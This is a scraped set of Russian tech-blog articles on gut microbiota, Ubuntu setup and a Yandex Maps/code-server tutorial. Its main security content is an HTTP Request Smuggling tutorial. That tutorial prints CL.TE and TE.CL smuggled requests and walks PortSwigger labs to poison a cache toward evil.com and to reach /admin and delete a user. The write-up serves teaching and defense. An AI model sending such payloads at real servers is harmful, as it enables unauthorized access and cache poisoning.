праймеры, нуклеотиды, Taq-полимеразу и буферный раствор. Нагревают до 94-96 °C, чтобы двойная спираль ДНК распалась на две цепи. При снижении температуры до 50-65 °C праймеры связываются с целевыми участками ДНК. При 72 °C Taq-полимераза синтезирует новую цепь ДНК. Этот процесс повторяют 25-40 раз, чтобы создать множество копий целевой ДНК.Как мы можем улучшить свою микробиотуМногие из нас хотят укрепить своё здоровье, поэтому логично, что на ум приходит мысль о том, а почему бы не проверить сначала состояние своей микробиоты и уже потом целенаправленно её улучшать? Для этого вы можете сделать анализ микробиоты кишечника. Компании, предлагающие такие анализы, утверждают, что могут определить виды и количество микробов в вашем кишечнике. Но такая диагностика относится пока к достаточно молодой области исследований, и её результаты не всегда точны. Некоторые исследования указывают на ограниченную пользу таких анализов, поскольку количество и типы бактерий в стуле могут сильно варьироваться, а анализы не показывают, живы ли бактерии.Кроме того, по анализу микробиома нельзя точно диагностировать заболевания. Если вас беспокоит состояние здоровья, то лучше обратиться к врачу. Никто ещё не знает, существует ли идеальный состав микробиоты. Скорее всего, важнее функции, которые выполняют бактерии, а не их типы и количество.Для укрепления микробиоты можно предпринять следующие шаги:Откорректировать своё питание. Речь не о кратковременных диетах, а об изменении рациона на долгосрочной основе, желательно на всю жизнь. Питание должно быть сбалансированным, богатым полезными растительными продуктами. Для роста полезных микроорганизмов нужна ферментированная пища, зелёные овощи, листовая зелень, ягоды, цельнозерновые культуры. Кроме клетчатки, на микробиоту положительно влияют полифенолы, омега-3 жирные кислоты и растительные белки, а также кисломолочные продукты. Высокое потребление жиров, животных белков, сахара и соли, а также низкое потребление клетчатки неблагоприятно влияют на микробиоту. Добавки, такие как эмульгаторы и подсластители, также могут оказывать негативное воздействие на кишечный «зоопарк».При необходимости принимайте дополнительно пробиотики. Если из-за несбалансированного питания или приёма антибиотиков развился дисбиоз, то тогда имеет смысл активно восстанавливать микробиоту. Помимо употребления клетчатки и пробиотических продуктов, таких как кефир, специально разработанные микробиологические препараты с пробиотическими комплексами могут быстро помочь. Пробиотики представляют собой живые микроорганизмы, которые в достаточном количестве положительно влияют на здоровье, укрепляя кишечный барьер и подавляя рост вредных бактерий. Регулярная физическая активность может помочь сохранить здоровую микробиоту, улучшить работу кишечника и кровообращение. Но и здесь важно знать меру. Согласно одному исследованию, длительный физиологический стресс негативно сказывается на состоянии микробиоты кишечника и проницаемости его стенок. Стресс разрушает не только микробиоту, но и дестабилизирует все системы организма. К стрессу относятся психологические реакции и негативные ситуации, вредные привычки (недостаточный сон, нарушение режима сна, хаотичный прием пищи без чёткого графика, гиподинамия, курение, приём наркотических средств, алкоголь). Микробиота человека — это сложная экосистема, играющая ключевую роль в нашем здоровье. Понимание её устройства и функционирования открывает новые горизонты в медицине и помогает нам лучше заботиться о своём организме."
96,HTTP Request Smuggling: как особенности в обработке HTTP-заголовков приводят к атакам CL.TE и TE.CL,Инфосистемы Джет,российская ИТ-компания,0,"Аппаратное обеспечение, Консалтинг и поддержка, Связь и телекоммуникации",2025-04-09,"HTTP Request Smuggling или контрабанда HTTP-запросов — тип уязвимости, который возникает из-за несоответствий в обработке HTTP-запросов между фронтендом и бэкендом. Каким образом различия в интерпретации заголовков позволяют атакующим использовать эту уязвимость? Как HTTP Request Smuggling можно использован в сочетании с Web Cache Poisoning? И на что обратить внимание, чтобы предотвратить подобные атаки? Разберем вместе на примере лабораторных работ с PortSwigger.Введение в HTTP и его эволюцияПротокол HTTP (HyperText Transfer Protocol) — основа современного веба. Первая версия HTTP/0.9 была крайне простой и поддерживала только GET-запросы. С появлением HTTP/1.0 клиенты получили возможность отправлять более сложные запросы. Но для каждого из них требовалось устанавливать новое TCP-соединение, что создавало значительную нагрузку на сеть, особенно при загрузке страниц с множеством ресурсов — изображения, скрипты и стили.В HTTP/1.1 появилась поддержка постоянных соединений (Persistent Connections). Это позволило использовать одно TCP-соединение для нескольких запросов и ответов, что значительно улучшило производительность. Также появилась возможность конвейерной обработки запросов (HTTP Pipelining), но из-за проблем с прокси-серверами и блокировкой очередей эта функция не получила широкого распространения.С развитием протокола добавлялись новые функции, которые улучшили производительность, но также привели к появлению новых уязвимостей — например, HTTP Request Smuggling. Эта уязвимость возникает из-за различий в обработке запросов между разными компонентами системы — балансировщиками нагрузки и серверами приложений. Усложнение процесса обработки запросов, включая использование заголовков Content-Length и Transfer-Encoding, увеличило риск их неправильной интерпретации.Современные версии протокола, такие как HTTP/2 и HTTP/3, продолжают развиваться, предлагая новые механизмы для повышения производительности и безопасности. Однако, несмотря на эти улучшения, уязвимости, связанные с неправильной обработкой запросов, остаются актуальными из-за сложности взаимодействия между разными компонентами системы.Основы HTTP-запросов и особенности их обработкиHTTP-сообщения — это основной способ обмена данными между клиентом и сервером в рамках протокола HTTP. Они делятся на два типа: запросы, которые инициирует клиент для выполнения действий на сервере;ответы, которые сервер возвращает в результате обработки запроса.Структура HTTP-сообщений — как запросов, так и ответов — состоит из нескольких  частей:● Строка запроса (Start Line). В запросе она содержит метод — например, GET, POST — путь к ресурсу и версию HTTP. В ответе указывается версия протокола, код состояния и его текстовое описание.● Заголовки (Headers). Это набор пар «ключ-значение» которые передают метаданные о запросе или ответе. Например, заголовки могут указывать: тип содержимого (Content-Type), размер данных (Content-Length) или кэширование (Cache-Control).● Пустая строка (Empty Line). Она разделяет заголовки и тело сообщения, сигнализируя о завершении метаданных.● Тело запроса (Body). Необязательная часть, которая содержит данные, связанные с запросом или ответом. Например, в POST-запросе тело может включать данные формы, а в ответе — содержимое запрашиваемого ресурса.Ключевые заголовки — Content-Length и Transfer-Encoding — важны в обработке сообщений. Заголовок Content-Length указывает размер тела в байтах, а Transfer-Encoding: chunked позволяет передавать данные частями (chunks). Однако одновременное использование этих заголовков может привести к конфликтам, например, к уязвимостям типа HTTP Request Smuggling, когда фронтенд и бэкенд по-разному интерпретируют запрос.Кроме того, HTTP-сообщения используют специальные символы \r\n — возврат каретки и перевод строки — для разделения строк и частей сообщения. Например:POST / HTTP/1.1\r\n Host: example.com\r\n Content-Length: 10\r\n \r\n wr3dmast3rКонцепция HTTP Request SmugglingHTTP Request Smuggling — это тип уязвимости, который возникает из-за несоответствий в обработке HTTP-запросов между фронтендом, например, балансировщиком нагрузки или reverse proxy, и бэкендом — сервером приложения. Фронтенд выступает в роли посредника, который принимает запросы от клиентов и передает их на бэкенд для дальнейшей обработки.Однако, если фронтенд и бэкенд по-разному интерпретируют заголовки Content-Length и Transfer-Encoding, это может привести к уязвимостям. Например:● Фронтенд может использовать заголовок Content-Length для определения размера тела запроса.● Бэкенд, в свою очередь, может полагаться на заголовок Transfer-Encoding: chunked, который указывает, что тело запроса передается частями.Если запрос содержит оба заголовка одновременно, это может привести к тому, что часть запроса останется необработанной и «перетечет» в следующий запрос. В результате у атакующего появится возможность внедрить вредоносные данные или манипулировать поведением сервера.Согласно RFC 2616, если запрос содержит оба заголовка — Content-Length и Transfer-Encoding — сервер должен игнорировать Content-Length и использовать Transfer-Encoding. Однако на практике фронтенд и бэкенд могут не следовать этому правилу, что и приводит к уязвимостям.Представьте, что фронтенд — это охранник на входе в здание, а бэкенд — сотрудник внутри. Если охранник и сотрудник по-разному интерпретируют инструкции, атакующий может обмануть охранника и пронести в здание запрещенный предмет. Точно так же, при HTTP Request Smuggling, атакующий может «протащить» вредоносный запрос, используя разницу в интерпретации данных между фронтендом и бэкендом.Важно отметить, что HTTP Request Smuggling не эксплуатирует уязвимости в самом веб-приложении. Вместо этого она использует особенности интерпретации HTTP-сообщений веб-серверами. Это инфраструктурная уязвимость, которая возникает из-за некорректной настройки или взаимодействия между компонентами веб-серверов.С помощью этой уязвимости при атаке можно достичь такие цели:● повышение привилегий; ● обход механизмов безопасности; ● доступ или изменение данных; ● кража сессии; ● отравление кэша.Это лишь некоторые из возможных вариантов использования уязвимости. В зависимости от контекста приложения и особенностей взаимодействия между фронтендом и бэкендом, атакующий может найти и другие способы применения HTTP Request Smuggling.Разница между CL.TE и TE.CL HTTP Request SmugglingРассмотрим два варианта HTTP Request Smuggling, характерных для HTTP/1.1: CL.TE и TE.CL. Но отметим, что подобные уязвимости могут возникать и в других версиях протокола. Ключевой момент — разница в интерпретации заголовков Content-Length (CL) и Transfer-Encoding (TE) между фронтендом и бэкендом. В зависимости от того, какой сервер использует какой заголовок, атакующий может манипулировать запросами, чтобы внедрить вредоносные данные.Давайте разберем, как это работает в случаях CL.TE и TE.CL, а также, почему важно правильно учитывать символы, особенно при использовании chunked-кодирования. Понимание этих механизмов поможет лучше защитить инфраструктуру от подобных атак.CL.TE (Frontend: Content-Length, Backend: Transfer-Encoding). В этом сценарии фронтенд использует заголовок Content-Length для определения размера тела запроса, а бэкенд — заголовок Transfer-Encoding: chunked для обработки тела запроса как chunked-данных.Рассмотрим пример запроса:POST / HTTP/1.1\r\n Host: example.com\r\n Content-Length: 43\r\n Transfer-Encoding: chunked\r\n \r\n 0\r\n \r\n GET /admin HTTP/1.1\r\n Host: example.comФронтенд видит Content-Length: 43, считает, что тело запроса составляет 43 байта и передает весь запрос на бэкенд. Бэкенд видит Transfer-Encoding: chunked и начинает обрабатывать тело запроса как chunked-данные — первый chunk: 0\r\n\r\n — это конец chunked-данных. Всё, что идет после — GET /admin HTTP/1.1\r\n Host: example.com — бэкенд интерпретирует как начало нового запроса. В результате бэкенд обрабатывает второй запрос — GET /admin — который «внедрил» атакующий.В этом случае атакующему нужно убедиться, что размер тела запроса, указанный в Content-Length, соответствует данным, которые фронтенд передаст на бэкенд. Остальные данные «перетекают» в следующий запрос.Пример подсчета символовTE.CL (Frontend: Transfer-Encoding, Backend: Content-Length). В этом сценарии фронтенд использует заголовок Transfer-Encoding: chunked для обработки тела запроса, а бэкенд использует заголовок Content-Length для определения размера тела запроса.Рассмотрим пример запроса:POST / HTTP/1.1\r\n Host: example.com\r\n Content-Length: 4\r\n Transfer-Encoding: chunked\r\n \r\n 7e\r\n GET /admin HTTP/1.1\r\n Host: example.com\r\n Content-Type: application/x-www-form-urlencoded\r\n Content-Length: 20\r\n \r\n exploit=exploit\r\n 0\r\n \r\nФронтенд видит Transfer-Encoding: chunked и обрабатывает тело запроса как chunked-данные — первый chunk: 7e (шестнадцатеричное значение, равное 126 байтам). Фронтенд читает следующие 126 байт, включая строку GET /admin HTTP/1.1 и всё, что идет после. Затем видит завершающий chunk (0\r\n\r\n) и завершает обработку запроса.Бэкенд видит Content-Length: 4 и читает только первые 4 байта тела запроса — 7e\r\n. Оставшиеся данные — GET /admin HTTP/1.1 и так далее — бэкенд не обрабатывает, и они «перетекают» в следующий запрос. Когда следующий пользователь отправляет запрос, бэкенд начинает его обработку с «перетекших» данных, что может привести к неправильной интерпретации запроса.В этом случае атакующий использует chunked-кодирование, чтобы фронтенд обработал весь запрос, а бэкенд прочитал только часть данных, указанную в Content-Length. Значение 7e (126 в десятичной системе) используется для указания размера chunk. Это позволяет фронтенду обработать большой объем данных, в то время как бэкенд прочитает только первые 4 байта.Пример подсчета символовКлючевые различия между CL.TE и TE.CLВажно правильно подсчитывать символы, потому что в CL.TE-атаке необходимо, чтобы размер тела запроса, указанный в Content-Length, соответствовал данным, которые фронтенд передаст на бэкенд. Остальные данные «перетекают» в следующий запрос.  В TE.CL-атаке атакующий использует chunked-кодирование, чтобы фронтенд обработал определенный объем данных, а бэкенд прочитал только часть, указанную в Content-Length. Для этого требуется точный расчета размера chunk и понимание как фронтенд и бэкенд интерпретируют данные.Классический пример отравления запросаРассмотрим пример, где атакующий отправляет запрос с двумя заголовками: Content-Length и Transfer-Encoding. Фронтенд и бэкенд интерпретируют запрос по-разному, что приводит к отравлению следующего запроса.Вот как это выглядит:Что здесь происходит:Атакующий отправляет запрос с заголовками Content-Length: 6 и Transfer-Encoding: chunked. Тело запроса содержит chunked-данные: 0\r\n\r\nG.Фронтенд — например, балансировщик нагрузки — интерпретирует запрос на основе Content-Length: 6 и считает, что тело запроса составляет 6 байт. Он передает весь запрос на бэкенд, включая символ «G».Бэкенд, в свою очередь, использует Transfer-Encoding: chunked и ожидает chunked-данные. Он обрабатывает 0\r\n\r\n как конец запроса и игнорирует символ «G». В результате символ «G» остается необработанным и «перетекает» в следующий запрос.Когда другой пользователь отправляет следующий запрос, бэкенд начинает его обработку с символа «G». Это приводит к тому, что запрос интерпретируется как GPOST вместо POST, из-за чего возникает ошибка.ПрактикаРассмотрим подобные атаки в деле на примере двух уязвимых приложений, в которых уязвимости HTTP Request Smuggling используется в комбинации с Web Cache Poisoning.Lab: Exploiting HTTP request smuggling to perform web cache poisoningЭта лабораторная работа включает фронтенд- и бэкенд-серверы, при этом фронтенд-сервер не поддерживает chunked-кодирование. Он настроен на кэширование определенных ответов.Цель — выполнить атаку с использованием уязвимости HTTP Request Smuggling, которая приведет к отравлению кэша. В результате последующий запрос на загрузку JavaScript-файла должен перенаправляться на сервер атакующего.Подтверждение уязвимости. На главной странице веб-приложения можно проверить наличие HTTP Request Smuggling. Во-первых, нам нужно определить, какие заголовки использует веб-приложение, например:● CL.TE — интерфейс использует заголовок Content-Length, серверная часть использует заголовок Transfer-Encoding. ● TE.CL — интерфейс использует заголовок Transfer-Encoding, серверная часть использует заголовок Content-Length.Обращаем внимание на эти две настройки, при проверке данной уязвимости они важны:Запрос для проверки атаки:Следующий после него запрос:Так как следующий по порядку запрос возвращает код состояния 404, можно понять, что веб-приложение уязвимо для подделки HTTP-запросов CL.TE.Изучение структуры приложения. При анализе истории HTTP-запросов можно заметить, что всё, что находится в директории /resources/* — кэшируется. Например, JavaScript-файлы, такие как /resources/js/tracking.js:При просмотре функции отображения постов в блоге можно заметить функцию перехода к следующему посту:При нажатии на ссылку отправляется GET-запрос на /post/next с параметром postId, после чего происходит перенаправление на следующий пост:Web Cache Poisoning. Это атака, при которой атакующий манипулирует кэшем сервера, чтобы заставить его сохранить вредоносные данные. Когда другие пользователи запрашивают закэшированный ресурс, они получают подмененные данные, что может привести к перенаправлению на вредоносный сайт или выполнению вредоносного JS-кода.Цель атаки — заставить сервер кэшировать вредоносный JavaScript-файл, который будут загружать другие пользователи. Для этого можно использовать HTTP Request Smuggling, чтобы подменить содержимое кэшируемого файла.Попробуем использовать HTTP Request Smuggling для подмены заголовка Host в запросе с перенаправлением:Когда мы отправили второй запрос, веб-приложение ответило нашим замаскированным запросом (/post/next?postId=5), и перенаправило нас на evil.com. Учитывая эту информацию, если мы сможем использовать перехват HTTP-запросов для заражения веб-кэша, мы сможем перенаправлять пользователей куда угодно.Размещаем эксплойт:Для атаки мы сначала отправляем с HTTP Request Smuggling отравленный запрос, который будет выполнять перенаправление на наш веб-сервер. После этого нам нужно отравить кэшируемый файл /resources/js/tracking.js, чтобы в кэш попало наше перенаправление, далее будет происходить импорт нашей полезной нагрузки на сайт.Запрос на HTTP Request Smuggling:Следующий отправленный запрос в приложении будет иметь перенаправление:Результат:Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerabilityЭта лабораторная работа включает два сервера: фронтенд, например, балансировщик нагрузки или reverse proxy, и бэкенд — сервер приложения. Важно отметить, что бэкенд-сервер не поддерживает chunked-кодирование. На сервере также есть админ-панель по пути /admin, но доступ к ней блокируется фронтенд-сервером.Цель — используя уязвимость HTTP Request Smuggling, провести атаку, которая позволит получить доступ к админ-панели на бэкенд-сервере и удалить пользователя carlos.Подтверждение уязвимости. Здесь мы можем попытаться определить, уязвимо ли веб-приложение для перехвата HTTP-запросов. Во-первых, нам нужно определить, какой тип HTTP-запроса используется, например:● CL.TE интерфейс использует заголовок Content-Length, серверная часть использует заголовок Transfer-Encoding. ● TE.CL интерфейс использует заголовок Transfer-Encoding, серверная часть использует заголовок Content-Length.Запрос на проверку HTTP Request Smuggling:Сервер возвращает код состояния 500. Поэтому мы можем предположить, что веб-приложение уязвимо для подделки HTTP-запросов TE.CL.Эксплуатация уязвимостиПроверяем админ-панель:Пробуем обойти ограничение с помощью HTTP Request Smuggling:Следующий запрос:Мы смогли обойти блокировку доступа к директории /admin — это уже что-то. Попробуем использовать localhost во втором запросе:Следующий запрос:Отлично, мы получили доступ к админ-панели, осталось удалить пользователя:Следующий запрос:Рекомендации по защитеHTTP Request Smuggling — серьезная уязвимость, которая может привести к компрометации данных и нарушению работы серверов. Понимание механизмов HTTP и правильная настройка серверов — ключ для предотвращения таких атак. Регулярное тестирование и обновление инфраструктуры помогут минимизировать риски и обеспечить безопасность ваших приложений. Также рекомендуется использовать современные версии протокола — HTTP/2 и HTTP/3 — у которых есть встроенные механизмы для предотвращения подобных атак.Четыре совета:Запретить повторное использование соединений с бэкендом. Это исключит возможность «перетекания» данных между запросами, а это — основа для атак типа Smuggling.Перейти на HTTP/2 для взаимодействия с бэкендом. Этот протокол использует бинарный формат и строгую структуру сообщений, что снижает вероятность ошибок интерпретации.Унифицировать ПО на фронтенде и бэкенде. Использование одинакового программного обеспечения минимизирует различия в обработке запросов, что снижает риск уязвимостей.Внедрить WAF (Web Application Firewall) с функцией обнаружения аномалий. Современные WAF способны анализировать трафик и блокировать подозрительные запросы, включая попытки HTTP Request Smuggling.Дополнительные ссылки:HTTP Desync Attacks: Smashing into the Cell Next Door — DEF CON HTTP 1 Vs HTTP 2 Vs HTTP 3 PortSwigger — HTTP Request Smuggling "
97,Мой идеальный Ubuntu: настройка системы под свои нужды,ПК Аквариус,Компания,0,"Программное обеспечение, Аппаратное обеспечение, Связь и телекоммуникации",2025-04-09,"Настройка Ubuntu под индивидуальные задачи — это создание собственного уюта. В этой статье я поделюсь своим опытом кастомизации системы. Возможно, эти наработки помогут вам сэкономить время и избежать лишних проб и ошибок. Все приведённые примеры тестировались на Ubuntu 22.04 LTS, но многие идеи применимы и в других версиях.Ubuntu Pro — почему бы и нетДля многих моих коллег стало открытием, что существует бесплатная подписка Ubuntu Pro. Вот почему она стоит внимания:Поддержка пакетов продлевается с 5 до 10 лет для LTS-версий;Расширенные обновления безопасности для репозиториев;Защита от уязвимостей для критических компонентов.Регистрация в Ubuntu ProПерейдите на страницу подписки.Скриншоты прохождения активацииНажать ""Get Ubuntu Pro now""Выбрать ""Myself""Если у Вас нет аккаунта, то пройдите регистрацию.""Yes, log me in""Здесь нас интересует команда под ""Command to attach machine:"".Активация на Вашем компьютереВам потребуется скопировать команду из предыдущего окна, вызвать терминал и выполнить команду:sudo pro attach <ваш_токен>Да для большинства может показаться это всё эфемерными надеждами на безопасность, но раз есть возможность получить Pro-функционал бесплатно — почему бы не воспользоваться?Драйверы — Ubuntu делает всё за ВасОдним из самых приятных аспектов использования Ubuntu является то, что система автоматически управляет драйверами. После установки достаточно выполнить следующую команду:sudo ubuntu-drivers autoinstallПосле этого Ubuntu будет автоматически уведомлять Вас об возможных обновлениях, загружать и устанавливать  при каждом запуске системы, избавляя вас от необходимости делать это вручную.Пример уведомленияGNOME Extensions — «оживляем» рабочий стол.Да, GNOME из «коробки» выглядит блекло и часто новички не знают, что с этим делать. Но с extensions.gnome.org это чистый холст для творчества. Вот к примеру мой рабочий сетап:Установка необходимых пакетовДля начала вам нужно установить несколько пакетов, которые позволят вам управлять расширениями GNOME. Вызовите терминал и выполните следующую команду:sudo apt install chrome-gnome-shell gnome-tweaksОткройте браузер и перейдите на сайт extensions.gnome.org;Включите расширение для браузера, которое позволит взаимодействовать с GNOME Extensions.extensionsВажно: не перегружайте систему плагинами — это будет влиять на производительность, а половина из них вам вряд ли пригодится.Настройка рабочего столаОткройте GNOME Tweaks;Перейдите в раздел Appearance;Здесь вы можете настроить темы  приложений, курсоров, значков и оболочки. Например:Все пользовательские темы хранятся в /usr/share/themes/, а значки — в /usr/share/icons/ и других соответствующих директориях. Все установленные темы и значки будут автоматически отображаться в GNOME Tweaks.Zsh + Aliases + SSH Config — удобный терминалИспользование терминала в Ubuntu может быть значительно упрощено и улучшено за счёт:Установка Zsh и Oh My ZshУстановить zsh и oh my zsh выполнив в терминальном окне:sudo apt install zsh sh -c ""$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)Переключить bash на zsh, командой:chsh -s $(which zsh)Настройка aliasalias — это удобные сокращения для часто используемых команд, которые позволяют ускорить работу в терминале.  Чтобы настроить alias в Zsh, откройте файл конфигурации ~/.zshrc и ~/.bashrc в bash соответственно. Ниже приведён мой пример конфигурации алиасов, который может быть полезен:alias в примерах# Укороченная команда для ls -la alias ll='ls -la' # Укороченная команда для очистки терминала alias c='clear' # Укороченная команда для apt с sudo alias apt='sudo apt-fast' # Укороченная команда для nano alias nn='nano' # Укороченная команда для перехода на уровень выше alias ..='cd ..' # Укороченная команда для выхода из терминала alias q='exit' # Укороченная команда для обновления и апгрейда системы alias uu='sudo apt-fast update && sudo apt-fast upgrade' # Укороченная команда для просмотра истории команд alias h='history' # Укороченная команда для поиска файла alias ff='find / -type f -name' # Укороченная команда для поиска директории alias fd='find / -type d -name' # Укороченная команда для отображения текущего времени alias date='date +%H:%M:%S' # Формат времени и даты в истории export HISTTIMEFORMAT='%F %T ' # Укороченные команды для перезагрузки, завершения работы и остановки системы alias reboot='sudo /sbin/reboot' alias poweroff='sudo /sbin/poweroff' alias halt='sudo /sbin/halt' alias shutdown='sudo /sbin/shutdown' # Подтверждение при перезаписи файлов alias mv='mv -i' alias cp='cp -i' alias ln='ln -i' # Защита от удаления корневой директории и подтверждение при удалении более 3 файлов alias rm='rm -I --preserve-root' # Ограничение на количество отправляемых пакетов при ping alias ping='ping -c 5' # Быстрый ping без ожидания интервала alias fastping='ping -c 100 -s 0.2'Настройка SSH ConfigВ этом разделе я не буду углубляться в подробности настройки SSH, так как многие авторы уже хорошо освещали эту тему. Вместо этого, я рекомендую ознакомиться с одним из примеров, который предлагает практические советы в статье - Практические советы, примеры и туннели SSH.Пакеты, которые я рекомендую установить:Теперь, когда Вы настроили окружение и оно выглядит более привлекательно, давайте рассмотрим, что еще можно установить для улучшения взаимодействия с ОС. Ниже приведены пакеты, которые я рекомендую, и причины их выбораApt-fast — ускоряем загрузку пакетовЗаменяем стандартный apt на apt-fast для перехода на многопоточную загрузку пакетов:sudo add-apt-repository ppa:apt-fast/stable sudo apt update && sudo apt install apt-fastTerminator вместо GNOME TerminalГибкое разделение экрана - Вы можете разделить окно терминала на несколько панелей и одновременно работать с несколькими сессиями;Расширенные настройки интерфейса - множество опций для настройки внешнего вида и поведения терминала.sudo apt install terminatorНиже описан метод установки terminator в роли основного терминал:sudo update-alternatives --config x-terminal-emulator sudo apt-get remove gnome-terminal sudo ln -s /usr/bin/terminator /usr/bin/gnome-terminalФайловый менеджер NemoРазделение рабочей области -  Nemo позволяет организовать рабочую область аналогично Total Commander, что делает навигацию более удобной;Копирование путей прямо из адресной строки: Это упрощает работу с файлами и папками.sudo apt-get upgrade --fix-missing --no-install-recommends nemoСделать Nemo основным файловым менеджером поможет выполнение:xdg-mime default nemo.desktop inode/directory application/x-gnome-saved-search gsettings set org.gnome.desktop.background show-desktop-icons false gsettings set org.nemo.desktop show-desktop-icons trueKate — легковесная IDE для работы с текстомПодсветка синтаксиса и нумерация строк;Встроенная интеграция с Git.sudo apt-get upgrade --fix-missing --no-install-recommends kateПосле установки Вы можете настроить Kate как стандартный текстовый редактор, выполнив:xdg-mime default kate.desktop text/plainДополнительный список пакетов, к установке:Obsidian - Отлично изложено применение в статье: Obsidian+Github вместо Notion: синхронизация, бекап и версионность (3-в-1);Vscode - Самая простая IDE;VirtualBox  - Всегда пригодиться для работы с виртуализацией;Drawio - Отлично подойдёт для визуализации Ваших идей;Telegram - Ваш основной мессенджер;VLC - Мультимедийный плеер;Portproton - Позволяет запускать игры для Windows на Linux.Сообщество Ubuntu — проблемы уже решеныХочу отдельно отметить, что за всё время использования Ubuntu у меня не возникло ни одной проблемы, которую нельзя было бы решить с помощью простого поиска. Достаточно ввести в поисковой строке фразу, состоящую из «<моя_проблема> ubuntu», и вы почти всегда найдете решение.ИтогUbuntu отличается высокой степенью кастомизации и простотой в использовании, что делает её универсальным решением для широкого круга задач."
98,Как создать веб-приложение со своей картой: подключение API v3 Яндекс Карт,Selectel,IT-инфраструктура для бизнеса,0,"Аппаратное обеспечение, Связь и телекоммуникации, Домены и хостинг",2025-04-09," Сколько карт установлено на вашем смартфоне? Попробуйте ответить на этот вопрос и задумайтесь, как часто их добавляют разработчики приложений. Кто-то отмечает на картах свои магазины, кто-то — делает проекты в духе Zenly, другие — показывают зоны доставки еды и т. д.   Если вам тоже пришлось «вшить» в свое веб-приложение карты, запаситесь терпением. В инструкции рассказываем, как это сделать и настроить тестовое окружение с IDE в облаке. Подробности под катом!  Введение: зачем инструкция, если есть документация Найти информацию о том, как добавить условный iframe с картой на свой сайт и отметить на ней точки, — довольно просто. Это довольно тривиальная задача, а реализация фичи есть в большинстве CMS. По итогу можно встроить окно с Яндекс Картой, на которой что-то размещено. Но оно будет или в виде почти статичного изображения (без возможности масштабирования), или выполнено в классическом интерфейсе разработчика.  Если вы хотите реализовать кастомную карту, на которой пользователи могут строить маршруты, создавать свои точки, взаимодействовать с другими и видеть ваши маркеры, придется ступить на путь API.  После выхода Яндекс Карты API 3.0 на смену 2.1 интерфейсы сильно изменились, а с документацией наблюдаются проблемы. Об этом жалуются и пользователи на форумах — и их можно понять: подавляющее количество запросов отправляют в документацию API 2.1, которая уже морально устарела. А актуальная документация местами недоработана.    Регистрация API Для начала необходимо зарегистрировать кабинет разработчика и завести API-интерфейс «JavaScript API и HTTP Геокодер».   Кабинет разработчика, меню.  Далее кликните по карточке интерфейса — откроется меню. По умолчанию оно пустое — нужно нажать создать API-ключ, нажав на кнопку Новый ключ.   Кабинет разработчика, список ключей API.  Наведите на карточку Key #N и нажмите кнопку Изменить. API-ключ скопируйте — он понадобится во время интеграции. Но понятно, что просто ключ не защитит ваше API, ведь он будет, по сути, виден всем пользователям через код разработчика.  Чтобы обезопасить приложение, у ключа есть вайтлисты с IP-адресами и HTTP Referer. По сути, вы должны либо прописать адреса клиентов, с которых будете обращаться к карте через ваше веб-приложение, либо — домен самого приложения. Спойлер: указание localhost тоже работает — но тогда любой желающий сможет использовать ваши карты, а вы не сможете получить к ним доступ, запустив фронтенд на устройстве вне локальной сети (например, с телефона).  Если вы работаете в своей тестовой среде, вероятно, придется поддерживать список IP-адресов. Но это не самая удобная схема, особенно если ваш роутер с динамическим IP или вы работаете из разных локаций. В таком случае оптимальнее всего — использовать облачное окружение для прототипирования и работы в stage-среде.  Как развернуть облачное stage-окружение Дисклеймер: инструкция актуальна именно для прототипирования. Одно из самых популярных open source-решений, которое позволяет развернуть тестовую среду, — проект code-server. С помощью него можно запускать VSCode прямо в браузере, без использования терминала с Vim. Что довольно удобно, если вы не приверженец работы с консолью во время разработки.  Также VSCode включает большой набор компонентов для работы, тогда как Vim и Emacs требуют знания специальных плагинов. Поэтому code-server больше подходит тем, кто привык работать с локальной IDE.  Процесс развертывания code-server можно разделить на три этапа.  Установка code-server в облаке Чтобы создать доступное через интернет stage-окружение с code-server, нужно поднять облачный сервер. Для этого зарегистрируйтесь в панели управления, перейдите в раздел Продукты → Облачные серверы и нажмите кнопку Создать сервер.  Далее выберите готовую конфигурацию или соберите собственную. Выбор зависит от ваших требований к тестовому окружению, но для работы с самим code-server будет достаточного 1 vCPU, 2 ГБ RAM и 20 ГБ на диске. Такая конфигурация будет стоить всего 55 ₽/день.   Панель управления Selectel, создание сервера.  Не торопитесь нажимать на кнопку Создать сервер. Перед этим нужно в поле User Data вписать такой скрипт:  # Скрипт для установки code-server. Для простоты примера используется root, но это небезопасный способ.  #!/bin/bash  export HOME=/root export SHELL=/bin/bash mkdir -p /root/.config/code-server/  # cURL подтягивает образ IDE curl -fsSL https://code-server.dev/install.sh | sh cat > /root/.config/code-server/config.yaml << EOF  # адрес и порт, на котором будет работать code-server bind-addr: 0.0.0.0:8080 # способ авторизации — через пароль auth: password # пароль для входа password: secret # отключение SSL в рамках примера cert: false  EOF  # настройка автозапуска VSCode для пользователя root mkdir -p /etc/systemd/system/code-server\@root.service.d cat > /etc/systemd/system/code-server\@root.service.d/override.conf << EOF  [Service] Environment=""SHELL=/bin/bash""  EOF  systemctl daemon-reload systemctl enable code-server@root systemctl start code-server@root  Обратите внимание на комментарии в скрипте. В частности — не забудьте указать пароль, который будет закрывать среду code-server от случайных проходимцев.  Теперь можно нажать кнопку Создать сервер — в течение нескольких минут окружение будет готово.  Подключение к code-server Следующим этапом нужно открыть облачный VSCode в браузере. Для этого впишите в строку поиска IP-адрес вашего сервера и укажите порт, на котором запущен code-server (по умолчанию — 8080). Пример: http://85.119.149.3:8080.  Далее нужно авторизоваться и создать тестовый index.html — на этом большая манипуляций часть.   VSCode (code-server), тестовый index.html.  Настройка домена Далее необходимо приобрести доменное имя и подключить его к вашему серверу. Для этого можно делегировать домен на DNS-хостинг Selectel, после — создать A-запись, чтобы связать его с IP-адресом. По итогу вы сможете подключиться к code-server таким образом: http://<your-domain>:8080.  Отлично! Чтобы вы могли по домену обращаться к файлу index.html, можно запустить Live Server (Five Server) внутри VSCode. Для этого в расширениях среды разработки найдите данный плагин и установите его. После — откройте index.html, нажмите ПКМ по свободной области, выберите опцию «Open with Five Server» — и перейдите по сгенерированной ссылке: http://<your-domain>:8080/proxy/5500/. При желании, конечно, можно развернуть Nginx — но для тестового стенда будет удобнее Five Server.   Five Server, тестовый файл index.html.  Подключение JavaScript API к приложению Сейчас index.html содержит только заголовок — настало время добавить саму карту. Но перед этим нужно донастроить API.  Настройка API Вы подключали домен не просто так — нужно настроить подключение к нашему API через HTTP Referer (домен). Для этого перейдите в кабинет разработчика, наведите на карточку своего ключа и нажмите Изменить. В поле «Ограничение по HTTP Referer» добавьте свой домен и нажмите Ок.   Кабинет разработчика, настройка доступа по домену к API Яндекс Карт.  Подготовка index.html Далее внутри тестового 